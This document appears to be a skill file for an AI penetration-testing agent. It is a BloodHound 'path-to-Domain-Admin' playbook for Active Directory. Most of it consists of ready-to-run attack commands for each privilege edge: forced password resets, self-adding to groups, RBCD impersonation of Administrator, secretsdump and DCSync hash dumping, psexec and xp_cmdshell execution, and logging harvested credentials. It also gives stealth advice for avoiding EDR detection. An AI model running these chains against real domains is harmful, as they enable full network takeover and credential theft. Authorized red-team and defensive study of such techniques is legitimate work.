---
name: BloodHound Path-to-DA
description: Reference for BloodHound + bhgraph (RedAmon NetworkX path-finder) covering collection, ownership marking, path-to-DA queries, edge-walk recipes per BloodHound edge type, and saturation strategy.
---

# BloodHound Path-to-DA Playbook

Reference for the RedAmon-specific `bhgraph` workflow: BloodHound JSON collection -> NetworkX in-memory graph -> path-to-DA queries -> edge-walk execution -> re-saturation. Pull this in when you have ANY valid domain credential and want a focused path-finder reference, separate from the broader `/skill ad_kill_chain`.

> Black-box scope: probes drive the DC via `bloodhound-python` for collection and `bhgraph` for analysis (both pre-installed in `kali_shell`). No Neo4j required -- bhgraph runs in-memory over BloodHound's JSON output.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| BloodHound collection | `kali_shell bloodhound-python` | Generates ZIP files of BloodHound JSON. |
| Graph load + state | `kali_shell bhgraph load` | RedAmon-specific NetworkX path-finder over BloodHound JSON. |
| Path-finding queries | `kali_shell bhgraph <subcommand>` | Stateful; `path-to-da`, `kerberoastable`, etc. |
| Edge-walk execution | `kali_shell` (impacket / bloodyAD / certipy / nxc) | One tool per edge type (table below). |
| Mark ownership | `kali_shell bhgraph own` | After every successful credential capture. |

## Working directory

```bash
mkdir -p /tmp/adkc/bh && cd /tmp/adkc/bh
```

`bhgraph` persists state at `/tmp/adkc/bhgraph.json`. This skill's working dir is shared with `/skill ad_kill_chain`.

## Phase 1: collect

```bash
bloodhound-python -c All,LoggedOn \
  -d $DOMAIN \
  -u $USER -p $PASS \
  -ns $DC_IP \
  --zip \
  -op bh
```

Flags:

| Flag | Use |
|---|---|
| `-c All` | All collection methods (groups, sessions, ACLs, GPOs, certificates, etc.) |
| `-c All,LoggedOn` | Adds active-session enumeration (loud; alerted by some EDRs) |
| `-c DCOnly` | Quietest collection: LDAP only, no SMB / WinRM probes |
| `-c LocalAdmin` | Local-admin enumeration (requires SMB on each host) |
| `--zip` | Output as a single ZIP for bhgraph |
| `-op bh` | Output prefix |

Quiet collection alternative:

```bash
bloodhound-python -c DCOnly -d $DOMAIN -u $USER -p $PASS -ns $DC_IP --zip -op bh_dconly
```

## Phase 2: load + own

```bash
# Load the ZIP into bhgraph (any number of zips can be merged)
bhgraph load /tmp/adkc/bh/*.zip

# Quick stats: how many users / computers / edges / etc.
bhgraph stats

# Mark every credential you control as owned. UPN format:
bhgraph own "$USER@$DOMAIN"
bhgraph own "svc_sql@$DOMAIN" "alice@$DOMAIN" "FILESERVER01\$@$DOMAIN"
```

The `own` set drives every path-finding query. Forget to own a new credential and the path-finder won't see the shorter path.

## Phase 3: path-to-DA

```bash
bhgraph path-to-da
```

Returns the shortest path (or paths, if multiple equivalent length) from any owned principal to `Domain Admins` (or any other DA-equivalent group: `Enterprise Admins`, `Schema Admins`, `Administrators`).

Sample output:

```
[OWNED] alice@CORP.LOCAL
   --MemberOf--> SUPPORT-USERS@CORP.LOCAL
   --GenericAll--> svc_backup@CORP.LOCAL
   --AdminTo--> SQL01.CORP.LOCAL
   --HasSession--> domain_admin@CORP.LOCAL
   [TARGET] DOMAIN ADMINS@CORP.LOCAL
```

Each arrow is an edge; the next phase walks each edge with the right tool.

## Phase 4: edge-walk recipes

| BloodHound edge | What it means | Walk it with |
|---|---|---|
| `MemberOf` | Inherited group permissions | Passive; no action needed |
| `GenericAll` (on user) | Full control over the principal | `bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC_IP set password "$TARGET" 'NewP@ssw0rd!'` (force-change password) |
| `GenericAll` (on group) | Full control; can add yourself | `bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC_IP add groupMember "$GROUP" "$SELF"` |
| `GenericAll` (on computer) | Allows RBCD setup, password reset on machine acct, etc. | RBCD chain: `impacket-addcomputer` -> `impacket-rbcd` -> `impacket-getST -impersonate Administrator` |
| `ForceChangePassword` | Reset the user's password | `bloodyAD set password "$TARGET" 'NewP@ssw0rd!'` (no need for current password) |
| `AddMember` (on group) | Add yourself to the group | `bloodyAD add groupMember "$GROUP" "$SELF"` |
| `WriteDACL` | Modify DACL of the target | `impacket-dacledit -action write -rights FullControl -principal $SELF -target $TARGET "$DOMAIN/$USER:$PASS@$DC_IP"`; then re-run as if you had the granted right |
| `WriteOwner` | Change object owner | `impacket-owneredit -action write -new-owner $SELF -target $TARGET "$DOMAIN/$USER:$PASS@$DC_IP"`; then `WriteDACL` chain |
| `ReadGMSAPassword` | Read gMSA managed password | `gMSADumper.py -u $USER -p $PASS -d $DOMAIN -l $DC_IP` |
| `AllowedToDelegate` (constrained) | T2A4D: impersonate any user to specific SPN | `impacket-getST -spn $SPN -impersonate Administrator "$DOMAIN/$USER:$PASS"` |
| `AllowedToAct` (RBCD) | Resource-Based Constrained Delegation | `impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'attacker$' -computer-pass 'P@ss'`; `impacket-rbcd -delegate-from 'attacker$' -delegate-to '$TARGET' "$DOMAIN/$USER:$PASS"`; `impacket-getST -spn cifs/$TARGET -impersonate Administrator '$DOMAIN/attacker$:P@ss'` |
| `AdminTo` (on computer) | Local admin on the target | `impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET_IP"`; or `impacket-secretsdump` for hash extraction |
| `HasSession` (target user logged on to a host) | Get local admin on the host -> dump session creds | `impacket-secretsdump "$DOMAIN/$USER:$PASS@$HOST"` (after gaining AdminTo on $HOST) |
| `CanRDP` | RDP into the host | `xfreerdp /u:$USER /p:$PASS /v:$HOST` |
| `CanPSRemote` | WinRM remote PowerShell | `nxc winrm $HOST -u $USER -p $PASS -X 'whoami /priv'` |
| `ExecuteDCOM` | DCOM exec on the host | `impacket-dcomexec "$DOMAIN/$USER:$PASS@$HOST"` |
| `SQLAdmin` | xp_cmdshell on a SQL server | `mssqlclient.py "$DOMAIN/$USER:$PASS@$SQL_HOST" -windows-auth`; then `enable_xp_cmdshell` and `xp_cmdshell` |
| `GetChanges` + `GetChangesAll` | DCSync rights | `impacket-secretsdump -just-dc-ntlm "$DOMAIN/$USER:$PASS@$DC_IP"` |
| `GetChangesInFilteredSet` | Limited DCSync (RODC-style) | Same command; output may be filtered |
| `Owns` (object owner) | Implicit `WriteDACL` via ownership | Same as `WriteOwner` chain |
| `WriteSPN` | Write servicePrincipalName | Set an SPN on a target user; Kerberoast that user's hash |
| `AddSelf` (on group) | Self-add primitive | `bloodyAD add groupMember $GROUP $SELF` |
| `AddKeyCredentialLink` | Shadow Credentials primitive | `pywhisker --target $TARGET --action add` (pywhisker not pre-installed; build via `git clone`) |
| `SyncLAPSPassword` | Read LAPS local-admin password | `nxc smb $HOST -u $USER -p $PASS --laps` |
| `ReadLAPSPassword` | Same | Same command |
| `DCFor` | Computer is a Domain Controller | Target machine; chain `AdminTo` for full DC admin |

## After every successful edge-walk

```bash
# 1. Save any new credential you obtained
echo "$NEW_USER:$NEW_PASS" >> /tmp/adkc/creds.txt

# 2. Mark the new principal as owned in bhgraph
bhgraph own "$NEW_USER@$DOMAIN"

# 3. Re-run path-to-da; the path may have shortened dramatically
bhgraph path-to-da

# 4. Optionally: re-run kerberoastable / asreproastable / unconstrained
bhgraph kerberoastable
bhgraph asreproastable
bhgraph unconstrained
```

This is the self-reinforcing loop. Every credential pivot extends the owned set; every extension shrinks paths.

## Other bhgraph queries

| Query | Returns |
|---|---|
| `bhgraph path-to-da` | Path to Domain Admins (default) |
| `bhgraph path-to <NODE>` | Path from any owned principal to NODE |
| `bhgraph path-from <NODE> <NODE>` | Path between two specific nodes |
| `bhgraph kerberoastable` | All accounts with SPNs (Kerberoast targets) |
| `bhgraph asreproastable` | All accounts with `DONT_REQUIRE_PREAUTH` |
| `bhgraph unconstrained` | Computers with unconstrained delegation |
| `bhgraph dcsyncers` | Principals with `GetChanges` + `GetChangesAll` |
| `bhgraph high-value` | BloodHound-marked high-value nodes |
| `bhgraph laps` | Computers with LAPS deployed |
| `bhgraph shadowed-by <USER>` | Who has Shadow Credentials primitive on USER |
| `bhgraph lookup <NAME>` | Inspect one principal: edges in/out, group memberships |
| `bhgraph stats` | Node / edge counts |
| `bhgraph owned` | List currently-owned principals |

For very large environments (>50k users / >100k edges), stats / queries take 10-30 seconds; cache the result for the session.

## Multi-credential ownership saturation

When you have credentials from multiple sources (cracking, spraying, looting), mass-add them:

```bash
bhgraph own \
  "alice@$DOMAIN" \
  "svc_sql@$DOMAIN" \
  "svc_backup@$DOMAIN" \
  "FILESERVER01\$@$DOMAIN" \
  "WORKSTATION-42\$@$DOMAIN"

bhgraph path-to-da
```

The bigger the owned set, the more paths bhgraph can find. A single new computer-account credential often unlocks RBCD chains.

## Cross-trust path-finding

When BloodHound captures multiple domains in a forest:

```bash
# Collect from each child domain
bloodhound-python -d child.$DOMAIN -u $USER -p $PASS -ns $CHILD_DC_IP --zip -op child_bh

# Load both
bhgraph load /tmp/adkc/bh/*.zip /tmp/adkc/bh/child_bh*.zip

# Path-to-EA (Enterprise Admins) finds cross-domain paths
bhgraph path-to "Enterprise Admins@$DOMAIN"
```

## OPSEC

| Action | Loudness |
|---|---|
| `bloodhound-python -c All,LoggedOn` | LOUD: SMB enum on every host, session enumeration triggers Event 4624 / 4634 spam |
| `bloodhound-python -c DCOnly` | QUIET: LDAP queries only |
| `bloodhound-python -c All` (no LoggedOn) | MEDIUM: SMB enum without session probing |
| `bhgraph` queries | SILENT: all local, no network |
| Edge walks (each impacket call) | VARIES: see `/skill ad_kill_chain` Phase 6 OPSEC notes |

For stealth-conscious engagements, start with `-c DCOnly` and add `-c LocalAdmin` later if needed.

## Validation shape

A clean BloodHound finding includes:

1. The collection mode used and the credential.
2. Stats from `bhgraph stats` (node counts, edge counts).
3. The shortest path to DA at the moment of discovery (`bhgraph path-to-da`).
4. The chain of edge-walks executed (which tool, which credential pivot).
5. The final principal achieving DA-equivalent.
6. Any new ownership chains that became visible after the walk (re-run path-to-da AFTER and document the difference).

## False positives

- `bhgraph path-to-da` returns no path: either no exploitable chain exists from owned principals, or you forgot to mark a credential.
- BloodHound flags a `GenericAll` edge but the actual ACL has been changed since collection -- always confirm with a fresh `impacket-dacledit -action read` before exploiting.
- BloodHound shows a `HasSession` edge but the session has long since expired -- always confirm via `nxc smb --loggedon-users`.
- Cross-trust path is shown but the trust direction or filter doesn't actually allow what BloodHound thinks.

## Hand-off

```
Path-to-DA found and walked       -> /skill ad_kill_chain Phase 9 (DCSync) once dcsyncers query succeeds
Kerberoastable target identified   -> /skill kerberoasting (Phase 2)
ASREPRoastable users identified    -> /skill kerberoasting (Phase 1)
AD-CS template discovered          -> /skill ad_cs_esc
gMSA password discovered           -> bloodyAD or gMSADumper.py for cleartext
Cross-trust path                   -> /skill ad_kill_chain (parent-child trust abuse)
NTLM relay candidate               -> NTLM Relay community skill (Tier 4 #37) when shipped
LAPS password retrieved            -> direct local admin on the host -> /skill linux_privesc / /skill windows_privesc as applicable
```

## Pro tips

- Mark the new principal as `owned` BEFORE re-running `path-to-da`. Otherwise the path-finder won't use the shorter chain.
- BloodHound collection is a snapshot; ACLs change. Always confirm a critical edge with a real probe (`dacledit -action read`, `secretsdump --just-files-cab`, etc.) before relying on it.
- `-c All,LoggedOn` is loud but reveals `HasSession` edges that are gold for credential-theft chains. Tradeoff per engagement.
- For large environments, run `bloodhound-python` with `--zip` and load multiple zips into bhgraph; merging is automatic.
- The `MemberOf` edge is passive: do not "walk" it. Continue to the next edge in the chain.
- AddKeyCredentialLink (Shadow Credentials) requires `pywhisker` which is NOT pre-installed; `git clone` from the sandbox if needed.
- `WriteSPN` lets you create a Kerberoastable account on demand: set an SPN on a low-priv user, Kerberoast it, crack the user's password.
- After every successful edge-walk, re-run `bhgraph path-to-da`. The new owned principal often opens 2-3 shorter paths simultaneously.
- The bhgraph state at `/tmp/adkc/bhgraph.json` survives between agent steps but is wiped on container restart. Re-load and re-own at the start of each session.
- BloodHound CE introduced new edge types (e.g. `WriteAccountRestrictions`, `CoerceAndRelayNTLMtoLDAP`); bhgraph should handle them but verify with `bhgraph stats --edge-types`.
